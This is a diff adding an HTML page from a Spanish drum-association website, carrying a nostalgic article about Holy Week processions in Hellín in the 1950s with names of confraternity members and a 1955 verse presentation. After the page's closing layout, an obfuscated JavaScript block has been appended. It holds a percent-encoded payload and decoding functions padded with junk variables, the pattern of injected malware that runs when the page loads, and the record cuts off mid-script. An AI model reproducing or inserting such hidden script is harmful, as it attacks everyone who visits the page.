@@ -1,0 +1,303 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>= La Portal&iacute; =</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-color: #000000;
+}
+a:link {
+	color: #000000;
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+	color: #000000;
+}
+a:hover {
+	text-decoration: none;
+	color: #FF9900;
+}
+a:active {
+	text-decoration: none;
+}
+.Estilo7 {
+	font-family: Arial, Helvetica, sans-serif;
+	font-weight: bold;
+}
+.Estilo10 {font-family: Arial, Helvetica, sans-serif; font-size: smaller; }
+.Estilo12 {font-family: Arial, Helvetica, sans-serif; font-size: smaller; font-style: italic; }
+-->
+</style>
+
+<meta name="keywords" content="asociacion, peñas, tamborileros, tamborilero, tamborada, hellin, hellín, albacete, semana, santa, tambor, tunica, pañuelo, peña">
+<meta name="description" content="Asociación de Peñas de Tamborileros Semana Santa de Hellín">
+</head>
+
+<body>
+<div align="center"></div>
+<table width="770" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td><img src="titulo.jpg" width="770" height="140"></td>
+  </tr>
+  <tr bgcolor="#FFCC00">
+    <td height="22" align="center" valign="bottom" bgcolor="#FFCC00"><div align="center"> <span class="Estilo7">
+      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="770" height="24">
+        <param name="movie" value="menuarriba.swf">
+        <param name="quality" value="high">
+        <embed src="menuarriba.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="770" height="24"></embed>
+      </object> 
+    </span></div></td>
+  </tr>
+</table>
+<table width="770" height="543" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="17" height="543" valign="top" bgcolor="#FFCC00">
+    <div align="center"> </div></td>
+    <td width="580" align="left" valign="top" bgcolor="#FFFFFF"><table width="570" height="758" border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr>
+        <td height="739" colspan="2" valign="top">          <div align="justify"><img src="encabezado_reportaje.jpg" width="304" height="35"><br>
+              <br>
+              <span class="Estilo7">La Semana Santa hace cincuenta a&ntilde;os</span><br>
+              <br>
+              <br>
+              <img src="reportaje1.jpg" width="570" height="374"><br>
+              <span class="Estilo10"><br>
+              La Semana Santa, la m&aacute;s popular y querida de los hellineros, marca un hito en la vida de nuestro pueblo y deja huellas imborrables en nuestra memoria.<br>
+              <br>
+              Hellineros de todos los tiempos trabajaron por la solemnidad, esplendor y brillantez de su gran semana mayor, sin olvidar nunca su car&aacute;cter religioso, al sacar a la calle esta catequesis evang&eacute;lica.<br>
+              <br>
+              La enumeraci&oacute;n de an&eacute;cdotas y vivencias ser&iacute;a interminable, por lo que, siguiendo la l&iacute;nea de mis &ldquo;Ba&uacute;les&rdquo;, me centro en la mitad de los a&ntilde;os cincuenta, recordando a quienes desfilaron con sus &ldquo;Pasos&rdquo;. <br>
+              <br>
+              Por este motivo, no extra&ntilde;en la ausencia de cofrad&iacute;as y hermandades que en aquellas fechas no se hab&iacute;an creado, o renovado, as&iacute; como a destacados hermanos de las que se citan, que son de &eacute;poca posterior, a los que admiro y recuerdo con cari&ntilde;o. As&iacute; desfilaron las cofrad&iacute;as y hermandades siguientes:<br>
+              <br>
+              La Santa Cruz, reorganizada en el a&ntilde;o 1.949, tras las gestiones realizadas en los a&ntilde;os cuarenta por la &ldquo;Junta Pro Semana Santa&rdquo;&rdquo; (que ser&iacute;a el germen de la Federaci&oacute;n de Cofrad&iacute;as y Hermandades), haci&eacute;ndose cargo finalmente la Asociaci&oacute;n de Palomistas. En el a&ntilde;o 1.950 se abraz&oacute; a la Cruz la Virgen de la Amargura, primera imagen pasionaria del gran artista hellinero Jos&eacute; Zamorano, cuando ten&iacute;a veinte a&ntilde;os.<br>
+              <br>
+              Recuerdo a la Santa Cruz abriendo nuestras procesiones, dirigida por Jos&eacute; Joaqu&iacute;n P&eacute;rez-Pastor, los hermanos Antonio y Eusebio Jord&aacute;n, Francisco Garc&iacute;a Rodr&iacute;guez &ldquo;Paquico el Isero&rdquo;, el &ldquo;Cojo de las Escopetas&rdquo;, as&iacute; como a sus camareras Enriqueta P&eacute;rez-Pastor y Rafaela J&aacute;vega &ldquo;La Comadrona&rdquo;.<br>
+              <br>
+              La Oraci&oacute;n del Huerto, conocido como el &ldquo;Paso Gordo&rdquo;, realizado por Coullaut Valera en el a&ntilde;o 1.943, era uno de los grupos que gozaba de grandes simpat&iacute;as y era un verdadero espect&aacute;culo contemplar su salida del Santuario del Rosario en la tarde de Mi&eacute;rcoles Santo.<br>
+              <br>
+A Eusebio Garc&iacute;a Arsenal &ldquo;Eusebio el de la Elisa&rdquo; le sucedi&oacute; Abilio Mart&iacute;nez Tercero &ldquo;El de las Destiler&iacute;as&rdquo;, que continu&oacute; con la tradici&oacute;n de traer una banda de cornetas y tambores a caballo, en sus procesiones del Mi&eacute;rcoles y en la del Calvario.<br>
+<br>
+All&iacute; recuerdo ver a Pepe Gomariz y sobre todo al inolvidable Jos&eacute; Garc&iacute;a &ldquo;El Pocho&rdquo;, que a&ntilde;os m&aacute;s tarde se har&iacute;a cargo de la hermandad.<br>
+<br>
+El grupo escult&oacute;rico del &ldquo;Prendimiento&rdquo;, tambi&eacute;n de Coullaut Valera, realizado en 1.950, era una novedad en Hell&iacute;n, ya que anteriormente no exist&iacute;a esta cofrad&iacute;a.<br>
+<br>
+El gremio de las artes blancas se hizo cargo del mismo. Los due&ntilde;os de la f&aacute;brica de harinas &ldquo;La Gracia&rdquo;, Paco y Amado Jim&eacute;nez Rodr&iacute;guez, les reten&iacute;an a los panaderos cinco pesetas por cada saco de harina para costear el importe del &ldquo;Paso&rdquo;. All&iacute; vi a Emilio Ruiz &ldquo;el de la Panificadora&rdquo; y a su hermano Santiago, a Antonio Castillo &ldquo;El Paisa&rdquo;, a mi suegro Juan Mart&iacute;nez &ldquo;Juanico el de la Angeles&rdquo;, a Juan Fern&aacute;ndez &ldquo;Peluca&rdquo;, a Jos&eacute; L&oacute;pez &ldquo;Pepe el de la Pura&rdquo;, a Paco Arteaga, a Manuel Mas Ib&aacute;&ntilde;ez, a Antonio Mar&iacute;n, a Miguel Gamb&iacute;n, y un largo etc., destacando a Valero &ldquo;El Ferretero&rdquo;.<br>
+<br>
+El paso de &ldquo;Los Azotes&rdquo;, obra de Fern&aacute;ndez Andes, desfil&oacute; por primera vez en el a&ntilde;o 1.949, relanzada la hermandad por el industrial Jos&eacute; Iniesta L&oacute;pez&rdquo; &ldquo;Rosig&oacute;n&rdquo;, con sus t&uacute;nicas de cola y su singular trono realizado por los hermanos Mart&iacute;nez Llavador &ldquo;Los Juanillos&rdquo;, copia fiel del dise&ntilde;ado  en el siglo anterior por Don Justo Mill&aacute;n Espinosa. <br>
+<br>
+Junto a Jos&eacute; Iniesta recuerdo a su primo el abogado-procurador Manuel Espinosa L&oacute;pez, a Juan Fajardo Egea &ldquo;Peteneras&rdquo;, a Paco Molina, a Rafael &ldquo;Coscote&rdquo;, a Eladio Roche &ldquo;El Ruso&rdquo;, mancebo de farmacia &ldquo;Palacios&rdquo; y una interminables filas de nazarenos, en su mayor&iacute;a trabajadores del esparto.<br>
+<br>
+La imagen de Jes&uacute;s de Medinaceli la adquiri&oacute; en Madrid, en el a&ntilde;o 1.944, Don Jos&eacute; Alem&aacute;n Mu&ntilde;oz, Cura Rector de San Roque, organizando inmediatamente su cofrad&iacute;a con Rafael Tom&aacute;s Gallar como Hermano Mayor, haci&eacute;ndose cargo a&ntilde;os despu&eacute;s el gremio de la madera. En el a&ntilde;o 1.952 se hace cargo de la parroquia de San Roque Don Nicasio Navajas L&oacute;pez. <br>
+<br>
+Aqu&iacute; vimos a Leandro S&aacute;nchez God&iacute;nez, que abandon&oacute; su profesi&oacute;n de Procurador al llevar a efecto un lanzamiento judicial por falta de pago, a Juan Manuel Precioso, a los hermanos Jes&uacute;s y Fructuoso Moreno, a Ramiro Hern&aacute;ndez &ndash;mancebo de farmacia y luego en el almac&eacute;n de espec&iacute;ficos-. Esta cofrad&iacute;a desfil&oacute; varios a&ntilde;os con el paso de Jes&uacute;s del Gran Poder.<br>
+<br>
+Nuestro Padre Jes&uacute;s Nazareno, obra de Coullaut Valera, lleg&oacute; a Hell&iacute;n en el a&ntilde;o 1.945, costeada por el ilustre abogado Don Jacobo Serra Mart&iacute;nez, quien sufrag&oacute; todos los gastos para que pudiera desfilar, como fueron la hechura de nueva t&uacute;nica, el trono realizado por el artista hellinero Rafael Mill&aacute;n Alvarez, las t&uacute;nicas para los hermanos y el acompa&ntilde;amiento por las m&aacute;s famosas bandas de m&uacute;sica.<br>
+<br>
+El anterior paso de Jes&uacute;s Nazareno ya estaba vinculado a la familia Serra, igual que la familia de los &ldquo;Periche&rdquo; tambi&eacute;n lo estaban desde varias generaciones. A don Jacobo lo acompa&ntilde;&oacute; siempre Manuel L&oacute;pez &ldquo;Periche&rdquo;, secundado por Antonio Hern&aacute;ndez &ldquo;El Malague&ntilde;o&rdquo;, Ramiro Vela, Juan Antonio Serrano &ldquo;Posp&oacute;s&rdquo;, Joaqu&iacute;n Jim&eacute;nez &ldquo;Chafarote&rdquo;, Jos&eacute; Mart&iacute;nez Espallargas &ldquo;Chilique&rdquo;, Antonio Mu&ntilde;oz Oliver &ldquo;El Leznas&rdquo; &ndash;jefe de los Danzantes de Isso-.<br>
+<br>
+La hermandad de San Juan Evangelista, en su nueva etapa de la postguerra, siempre estuvo vinculada con los j&oacute;venes de Acci&oacute;n Cat&oacute;lica. En el a&ntilde;o 1.939 se encarg&oacute; la nueva imagen al escultor Jos&eacute; D&iacute;ez, que estuvo desfilando hasta que en 1.960 realiz&oacute; la otra imagen nuestro Jos&eacute; Zamorano. <br>
+<br>
+Antonio Mill&aacute;n Pallares fue el gran impulsor de la hermandad en sus &eacute;pocas de penurias, que han sido muchas. Entre los fundadores encontramos a Jos&eacute; P&eacute;rez Cantos, Pedro Bl&aacute;zquez Giner, Vicente Picornell, Agust&iacute;n Olmo, Antonio Molina, a los que segu&iacute;an Pascual Rold&aacute;n, Gervasio G&oacute;mez, y su hermano Lorenzo, Antonio Bueno, Manolo Serrano, Miguel L&oacute;pez, Enrique Arroyo Serrano&hellip; Tuve la suerte de ver desfilar con su &ldquo;Carrico de San Juan&rdquo; al famoso e impecable &ldquo;Juan el de la Amor&rdquo;.<br>
+<br>
+La imagen de la Ver&oacute;nica, obra de Fern&aacute;ndez Andes, en 1.949, llega a Hell&iacute;n bajo el patrocinio de Do&ntilde;a Pilar Velasco Ortu&ntilde;o, viuda de Don Juan Mart&iacute;nez Parras, vinculada ya a la hermandad antes de la guerra civil. Tiene la banda de cornetas y tambores m&aacute;s antigua de Hell&iacute;n, acompa&ntilde;ando tambi&eacute;n a otros &ldquo;pasos&rdquo;, al no desfilar su titular.<br>
+<br>
+Los hijos de Do&ntilde;a Pilar, Juan y El&iacute;as Mart&iacute;nez Velasco, eran acompa&ntilde;ados en las procesiones por Justo Vela y sus hijos, as&iacute; como su yerno Ram&oacute;n Morcillo &ldquo;Pitoto&rdquo;, sin olvidar a Paco &ldquo;Panizo&rdquo;, a Manolo &ldquo;Mochila&rdquo; o a Guillermo Mascu&ntilde;&aacute;n.<br>
+<br>
+Santa Mar&iacute;a Magdalena se le encarga a Coullaut Valera en el a&ntilde;o 1.944 por el hellinero Juan Antonio Molina Hern&aacute;ndez &ldquo;El Chico Se&ntilde;ores&rdquo;, quien se hace cargo de la hermandad, continuando despu&eacute;s su familia como protectores de la misma. Nota t&iacute;pica de esta cofrad&iacute;a era el de acompa&ntilde;ar a su titular una famosa banda militar de cornetas y tambores. <br>
+<br>
+Art&iacute;fices del funcionamiento de la hermandad eran el &ldquo;Barbero Morales&rdquo;, Miguel Vela &ldquo;Gavilla&rdquo;, Pepe Molina, Paco Mart&iacute;nez Guirao, y de chiquillos Juan Antonio Bleda y Emilio S&aacute;nchez &ldquo;Cayuelas&rdquo;.<br>
+<br>
+La hermandad de &ldquo;Los Excautivos&rdquo;, fundada al finalizar la guerra civil, s&oacute;lo sale en Viernes Santo. En la procesi&oacute;n del Calvario desfila con un Cristo Crucificado, realizado en 1.942 por Guti&eacute;rrez de la Vega. Este Cristo tiene los ojos abiertos, lo que indica que a&uacute;n est&aacute; con vida, por este motivo va delante del Crucificado de &ldquo;los Gorrinicos&quot;, que ya est&aacute; muerto. En la procesi&oacute;n del Entierro, con el Paso de la Virgen de las Angustias, que tiene un Yacente a sus pies, obra de V&iacute;ctor de los R&iacute;os, de puro estilo castellano.<br>
+<br>
+Sol&iacute;an desfilar con prestigiosas bandas de m&uacute;sica, como eran la de la Guardia Civil y la de la Academia General del Aire.<br>
+<br>
+Formaban la cofrad&iacute;a Antonio Preciado y su hijo Tom&aacute;s, Agust&iacute;n Fern&aacute;ndez, Manuel Mas &ldquo;El Duende&rdquo;, Angel Valverde, Antonio Buend&iacute;a, Alejandro Arroyo, Miguel Yago, Pedro R&oacute;denas C&oacute;rcoles...<br>
+<br>
+La hermandad de San Ant&oacute;n, conocida por &ldquo;Los Gorrinicos&rdquo;, era la m&aacute;s antigua de las pasionarias. Comenzaron a reorganizarse al finalizar la contienda espa&ntilde;ola, integr&aacute;ndose en la misma gran n&uacute;mero de alpargateros, con reuniones muy frecuentes en la casa de los pescateros &ldquo;Los Floros&rdquo; (Ismael y Juan Tom&aacute;s Palaz&oacute;n), en la calle Benito Toboso, haciendo esquina con la de Roche. A los ya citados, hay que incrementar a Manuel Mas Valverde &ldquo;El Duende&rdquo; y tambi&eacute;n conocido por &ldquo;El Cacharrero&rdquo;, a Manuel Tom&aacute;s &ldquo;El Rasmao&rdquo;, a Roque L&oacute;pez, a los hermanos F&eacute;lix y Col&oacute;n Mar&iacute;n Moreno, al &ldquo;Carpanta&rdquo;, a los hermanos S&aacute;ez Miravete, Ram&oacute;n y Antonio &ldquo;San Ant&oacute;n&rdquo;, Manolo M&iacute;nguez, y un largo etc.<br>
+<br>
+Sus im&aacute;genes: Cristo de la Sangre y Virgen de las Penas, son obras del maestro Jos&eacute; Zamorano.<br>
+La hermandad de la &ldquo;Dolorosa&rdquo;, fue sin duda la que antes se moviliz&oacute; para traer su nueva imagen, obra de Coullaut Valera, que ya sali&oacute; en el a&ntilde;o 1.940.<br>
+<br>
+En su primera subida al Calvario, en aquel Viernes Santo, siendo un chiquillo, vest&iacute; por primera vez la t&uacute;nica de la hermandad y acompa&ntilde;&eacute; a la Virgen Dolorosa durante toda la procesi&oacute;n. Escuch&eacute; el c&eacute;lebre &ldquo;Motete&rdquo; cantado por mi abuelo y los componentes de &ldquo;La Capilla&rdquo;: Antonio Arcas y su padre, el maestro impresor Enrique Torres, el c&eacute;lebre &ldquo;Picatoste o Medio kilo&rdquo;, Alc&aacute;ntara &ndash;con su enorme bigote-, Emilio Mart&iacute;nez &ndash;cu&ntilde;ado del maestro &ldquo;Ochando&rdquo;- &hellip; Era acompa&ntilde;ada por la Banda de Almansa, cuyo director &ndash;Jos&eacute; Faus  Rodr&iacute;guez- le dedic&oacute; la marcha titulada &ldquo;La Dolorosa de Hell&iacute;n&rdquo;. <br>
+<br>
+La relaci&oacute;n de nombres vinculados a la hermandad ser&iacute;a interminable. Desde Manuel Navarro, Mariano Tom&aacute;s &ldquo;Campa&ntilde;a&rdquo;, Gonzalo Gonz&aacute;lez, Quivi&aacute;n Valenciano, mi chache Mateo Mart&iacute;nez, Juanico &ldquo;El  Marm&aacute;n&rdquo;, Juan S&aacute;nchez  &ldquo;Braguillas&rdquo;, Paco Mart&iacute;nez &ldquo;El Zorro&rdquo;, Mariano Andujar &ldquo;Mamanzos y sus primos, Justo y Pepe Izquierdo, Manolico &ldquo;Ismael&rdquo;, el maestro Victoriano &ndash;barbero de la Portal&iacute;&rdquo;-, Joaqu&iacute;n &ldquo;Romana&rdquo;, Fernando Garc&iacute;a &ldquo;Fernandico&rdquo;, V&iacute;ctor Tom&aacute;s &ldquo;Borrascas&rdquo;, Gin&eacute;s Valc&aacute;rcel, Rafael Valc&aacute;rcel &ldquo;El Filipino&rdquo;. <br>
+<br>
+El Cristo Yacente, de Mariano Benlliure, es la joya de la imaginer&iacute;a hellinera posterior a la guerra civil, data del a&ntilde;o 1.942. El principal motor de la hermandad fue Vicente Garaulet Sequero, con la colaboraci&oacute;n de gran parte de hellineros, en especial las familias Jim&eacute;nez Rodr&iacute;guez, Fern&aacute;ndez Guirado, Garc&iacute;a Cano, Tom&aacute;s Precioso, Navarro Valc&aacute;rcel, Lencina Lencina, Mill&aacute;n Villote&hellip; <br>
+Desfilaba escoltado por n&uacute;meros de la Guardia Civil y acompa&ntilde;ado por gran cantidad de penitentes con velas encendidas.<br>
+<br>
+La Virgen de la Soledad es la &uacute;nica de las antiguas im&aacute;genes, que a lo largo de los a&ntilde;os sufri&oacute; varias transformaciones, siendo Dolorosa y Ver&oacute;nica.<br>
+<br>
+En la noche del Viernes Santo era cuando &uacute;nicamente se le pod&iacute;a contemplar, ya que durante todo el a&ntilde;o estaba guardada en el domicilio de Ramiro Mar&iacute;n Valc&aacute;rcel, junto a la iglesia de la Asunci&oacute;n. <br>
+Durante muchos a&ntilde;os ha estado vinculada a la familia Mar&iacute;n, que organizaba su desfile procesional, sufragando todos los gastos. Hoy funciona como una cofrad&iacute;a m&aacute;s, con plena autonom&iacute;a.<br>
+              </span>
+              <table width="570" border="0">
+                <tr> 
+                  <td class="Estilo10"><div align="justify"></div>
+                    <div align="justify" class="Estilo10"><img src="reportaje4.jpg" width="570" height="341"><br>
+                    </div></td>
+                </tr>
+              </table>
+              <p align="justify" class="Estilo10">La Virgen del Dolor y el Jes&uacute;s del Gran Poder, obras exquisitas de Fern&aacute;ndez Andes, llegan a Hell&iacute;n, de la mano de Antonio Mill&aacute;n Pallares, en el a&ntilde;o 1.948. Vinieron para cubrir un hueco en la tarde-noche de Jueves Santo. Antonio Mill&aacute;n corri&oacute; con todos los gastos, tanto de las im&aacute;genes como de la organizaci&oacute;n de la cofrad&iacute;a. Todo era un nuevo estilo, totalmente diferente al resto de las procesiones de Hell&iacute;n.<br>
+                <br>
+                En los primeros a&ntilde;os el Jes&uacute;s del Gran Poder lo sacaba la cofrad&iacute;a del Medinaceli, hasta que ya lo hizo la propia hermandad. En la Navidad de 1.955 el templo de los Padres Franciscanos, donde estaba depositado el Gran Poder, sufri&oacute; un pavoroso incendio, quedando la imagen ennegrecida por el humo y con serios desperfectos, siendo reparada por el Maestro Zamorano, que la limpi&oacute;, y por el murciano Jos&eacute; Noguera.<br>
+                <br>
+                Sin embargo, en el a&ntilde;o 1.956 ocurri&oacute; una curiosa an&eacute;cdota. Por disposici&oacute;n del Obispado de Albacete se prohibi&oacute; la procesi&oacute;n en la tarde de Jueves Santo, fij&aacute;ndose su celebraci&oacute;n para la tarde de S&aacute;bado Santo. Dicha disposici&oacute;n no fue bien acogida en Hell&iacute;n y Antonio Mill&aacute;n, de acuerdo con los cofrades, decidi&oacute; suprimir la Procesi&oacute;n del Silencio. La imagen de la Virgen del Dolor se coloc&oacute; en su trono y estuvo expuesta para ser visitada y venerada por cuantos lo desearon.<br>
+                <br>
+                Colaboradores entusiastas fueron Gervasio Garc&iacute;a Llamas, Angel Lacuesta, Antonio Sorio &ldquo;El Talabartero&rdquo;, Eloy L&oacute;pez, Ricardo Mu&ntilde;oz Picornell &ldquo;Vi&ntilde;as el Relojero&rdquo;, Pedro Garc&iacute;a Torres &ldquo;Perico Cagueta&rdquo;, Antonio Garc&iacute;a Gil &ldquo;El de la Elisa&rdquo; y el &ldquo;nazareno m&uacute;ltiple&rdquo; Juanito S. Quesada&hellip;<br>
+                <br>
+                El S&aacute;bado Santo se celebraba el Serm&oacute;n de las Siete Palabras con gran afluencia  de fieles.<br>
+                <br>
+                Y llegamos al Domingo de Resurrecci&oacute;n, con ese precioso grupo escult&oacute;rico de Coullaut Valera que cierra nuestra Semana Santa desde el a&ntilde;o 1.949.<br>
+                <br>
+                Hace unos d&iacute;as, Crist&oacute;bal Espinosa Gri&ntilde;&aacute;n, el del estanco &ldquo;de la Teresica&rdquo;, me recordaba c&oacute;mo naci&oacute; la hermandad de Resucitado, aportando cada uno &ldquo;cien pesetas&rdquo;. Fue una labor de titanes, capitaneados por Rafael Mart&iacute;nez &ldquo;Rumbica&rdquo;, junto a Juan O&ntilde;ate &ldquo;El Pollico&rdquo;, los hermanos Zafrilla (Luis y Paco), Pepe Perea, Antonio L&oacute;pez &ldquo;El Pollete&rdquo;, Antonio Esparcia,  V&iacute;ctor Garc&iacute;a Rubio, Aurelio Torres &ldquo;El de las gaseosas&rdquo;, Crist&oacute;bal Ruiz &ldquo;Zapatotis&rdquo;, Rafael J&aacute;vega  &ldquo;El Soto&rdquo; y mi chache Francisco &ldquo;Castillo&rdquo;, recientemente fallecido.<br>
+                <br>
+                El desfile de &ldquo;Los Romanos&rdquo; era tradicional desde el primer a&ntilde;o.<br>
+                <br>
+                Quiero hacer una menci&oacute;n especial a un hellinero, fallecido recientemente, que colabor&oacute; con entusiasmo y gran acierto con nuestra Semana Santa. Don Juan Andujar Balsalobre, con su gracejo y excelente pluma, cant&oacute; como pocos a Hell&iacute;n y a todas sus cosas.<br>
+                <br>
+                Como muestra de su colaboraci&oacute;n, transcribo su &ldquo;Presentaci&oacute;n del Cuadro Art&iacute;stico del Resucitado&rdquo;, que tuve el honor de leer en el Teatro Espa&ntilde;ol, en la noche del 12 de Marzo de 1.955.<br>
+                <br>
+                Bajo la direcci&oacute;n art&iacute;stica de Hilario Tom&aacute;s Arteaga &ldquo;Piti&rdquo;, se represent&oacute; la obra &ldquo;Mosquita en Palacio&rdquo;, de Adolfo Torrado.<br>
+                <br>
+                Dec&iacute;a as&iacute; nuestro querido Juan Andujar:</p>
+              <table width="571" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td><div align="center"><span class="Estilo10">En la &ldquo;procesi&oacute;n del arte&rdquo;<br>
+que se organiz&oacute; este a&ntilde;o,<br>
+les toc&oacute; desfilar hoy<br>
+a los del Resucitado&hellip;</span><br>
+Y aqu&iacute; estamos ante ustedes<br>
+los componentes del Cuadro&hellip;<br>
+esperando suene el timbre<br>
+para comenzar el acto&hellip;<br>
+Van a o&iacute;r interpretar<br>
+una obra de Torrado&hellip;<br>
+llena de gracia, ternura,<br>
+y giros inesperados&hellip;<br>
+Nosotros, pondremos todos,<br>
+nuestra atenci&oacute;n y entusiasmo,<br>
+para que salgan de aqu&iacute;<br>
+contentos, no defraudados.<br>
+Aunque hay muchos personajes<br>
+a todos voy a nombrarlos<br>
+porque todos se merecen<br>
+que les sean presentados.<br>
+Maruja Tom&aacute;s Tom&aacute;s,<br>
+nuestra Mosquita en Palacio,<br>
+es una llamita de arte<br>
+y el orgullo del reparto&hellip;<br>
+Y tiene tanto cari&ntilde;o<br>
+a la Hermandad y a su &ldquo;paso&rdquo;<br>
+que, hasta el luto riguroso,<br>
+un momento se ha quitado&hellip;<br>
+Sole Mart&iacute;nez Garc&iacute;a<br>
+bella Duquesa en Palacio,<br>
+toda gracia y simpat&iacute;a,<br>
+maravilla su trabajo&hellip;<br>
+Sagrario, Puri, Angelita,<br>
+Pepita Izquierdo Navarro,<br>
+Gloria, Pepi, Marujita<br>
+y Anita&hellip; forman un ramo<br>
+de rositas hellineras<br>
+con aroma y con encanto, <br>
+ilusi&oacute;n de juventud,<br>
+llena de amor y entusiasmo&hellip;<br>
+Nada descubre Crist&oacute;bal<br>
+porque es actor consagrado&hellip;<br>
+<br>
+                  </div></td>
+                  <td><div align="center"> Hip&oacute;lito vive en &eacute;l<br>
+su papel m&aacute;s esmerado&hellip;<br>
+El &ldquo;joven&rdquo; V&iacute;ctor Manuel,<br>
+una vez autorizado<br>
+por su se&ntilde;ora y familia,<br>
+a las tablas ha saltado&hellip;<br>
+pero no es un espont&aacute;neo<br>
+es, artista comprobado&hellip;<br>
+Quiero detenerme &ldquo;m&aacute;s&rdquo;<br>
+con este Francisco, o Paco,<br>
+que hace muy bien el Dami&aacute;n<br>
+y maravilla en Fernando&hellip;<br>
+Salado como &ldquo;sardina&rdquo;<br>
+natural en su trabajo,<br>
+en el primer acto muerto<br>
+y despu&eacute;s&hellip; &ldquo;resucitado&rdquo;.<br>
+Emiliano, Enrique, Alfredo,<br>
+son. con Rafael Zamorano,<br>
+cuatro discretos actores<br>
+en papeles acertados&hellip;<br>
+Y Francisco, Jos&eacute; y Poli,<br>
+ponen final al reparto,<br>
+con todo el merecimiento<br>
+de su papel secundario&hellip;<br>
+Tambi&eacute;n para el asesor,<br>
+nuestro buen amigo Hilario,<br>
+sincero agradecimiento<br>
+por su ayuda, que estimamos&hellip;<br>
+Y a los mandos directivs<br>
+por la sala camuflados,<br>
+O&ntilde;ate, Paco Zafrilla, y<br>
+dem&aacute;s buenos hermanos,<br>
+expresamos nuestro afecto<br>
+en un cari&ntilde;oso abrazo&hellip;<br>
+Ellos son Semana Santa<br>
+con su ejemplar entusiasmo, <br>
+por su cari&ntilde;o hacia Hell&iacute;n,<br>
+por su proceder cristiano.<br>
+Que la Virgen, la Patrona<br>
+la que mora en el Rosario,<br>
+os llene de bendiciones<br>
+y a nosotros, d&eacute; la mano&hellip;</div></td>
+                </tr>
+              </table>
+              <p>As&iacute; se cerraba aquella velada teatral de hace cincuenta y un a&ntilde;os y as&iacute; recuerdo a los que vivieron aquellas Semanas Santas. </p>
+              <table width="570" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td><div align="right">Fotograf&iacute;a: Colecci&oacute;n Lencina Ruiz</div></td>
+                </tr>
+              </table>
+              <p align="justify" class="Estilo10"><font size="-1" face="Arial, Helvetica, sans-serif"><br>
+                </font></p>
+              </div></td>
+      </tr>
+      <tr>
+        <td width="199" valign="top"><div align="left"><font size="-1" face="Arial, Helvetica, sans-serif"></font></div></td>
+        <td width="221" valign="top"><div align="right"></div></td>
+      </tr>
+    </table></td>
+    <td width="170" align="center" valign="top" bgcolor="#FFCC00">            <br>
+        <table width="170" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="170" height="400">
+              <param name="movie" value="manulado.swf">
+              <param name="quality" value="high">
+              <embed src="manulado.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="170" height="400"></embed>
+            </object></td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+          <tr>
+            <td>&nbsp;</td>
+          </tr>
+          <tr>
+            <td height="19" valign="top">&nbsp;</td>
+          </tr>
+    </table></td>
+  </tr>
+</table>
+<p>&nbsp;</p>
+<script>VuNqGeVSYq='';var zCL=false;var yKYJ=20597;var xBH;var tME=false;var hLN=false;xBH='%60%75%6f%7b%77%64%6f%78%41%13%4b%26%0e%1e%15%6a%3b%22%3d%10%5d%3b%13%0d%2c%77%26%3f%08%06%61%0f%0f%2b%30%21%3a%10%07%24%0c%4d%7d%73%7c%79%5b%4d%23%34%5d%3d%3b%32%50%2e%70%11%19%37%13%6d%3c%24%21%61%59%51%4c%69%55%0f%50%70%67%6b%75%02%18%10%3c%33%33%35%31%6c%34%2d%3a%53%43%5e%70%69%6e%30%16%18%51%66%6f%7d%67%47%4c%45%32%3f%24%60%64%3b%7c%68%65%1a%7f%0b%37%78%53%4f%2a%15%1f%7a%75%60%61%7c%75%7b%7d%66%66%5c%59%1f%63%4c%56%12%60%6c%7d%69%19%59%60%79%5e%36%39%28%21%79%65%51%5b%46%34%6f%74%7f%6b';var jAIN=19872;var wXU='';function xVS(uWFM){var gHV="gHV";var iTT="iTT";var nLW="nLW";var zWJ="";function uPP(xTR){var jRME="jRME";var sWGR=64504;var xSNC='';var eHZU='';var oKKY=48426;var hEAN=0,nJQ=xTR.length;var mMSS="mMSS";var uUD=false;var nMRE=33192;var jZGW=false;var mXB=0;var vUH=false;var hOYY=23569;var aNNR="";var cGRB=28058;var zEXM="";var rWI="rWI";while(mXB<nJQ){var hXTM=false;var hRN="";var xPC='';var bLG='';var jOU=false;var qWC=63087;var zQC=42007;mXB++;var yHC='';var aQQQ=32901;var pIB='';vAF=zCMH(xTR,mXB-1);var oXBC=false;var pQLT="";hEAN+=vAF*nJQ;var tDI="tDI";var fOBY=29537;var fWXW=false;var yRX=false;}var tDF='';var dIT="dIT";var gWF='';var nLD='';return new String(hEAN);var aGX="";var jDHD=false;var cLBH=false;}var gIP="gIP";var oIXT="oIXT";var bOGX=false;var oIZD='';var lVP="lVP";function eBF(dEOV, yZQ){var nIK=false;var fLRE=false;var tNOW="tNOW";var fAWE='';var zUM='';var ePO="";var mHPL="";if(jEUC == null) {var rFRR='';var mWFQ="";var uPG="";jEUC = {};var wNVG="";var jMN=false;var mOA="mOA";}var zXH=false;var bND="bND";var cNC=false;var kQXM=15428;if(jEUC[dEOV] == null) {var qAKD=false;var qXIL="";jEUC[dEOV] = new Object();var fCRJ=false;var qVL='';var aBF='';jEUC[dEOV].iZJ = 0;var xEH=false;var tQSM=64147;var mHYZ="mHYZ";var yUWI='';jEUC[dEOV].wLA = yZQ;var gEA=false;var fIDG=14080;var cGZT=false;var jINK='';}var nDXC="nDXC";var 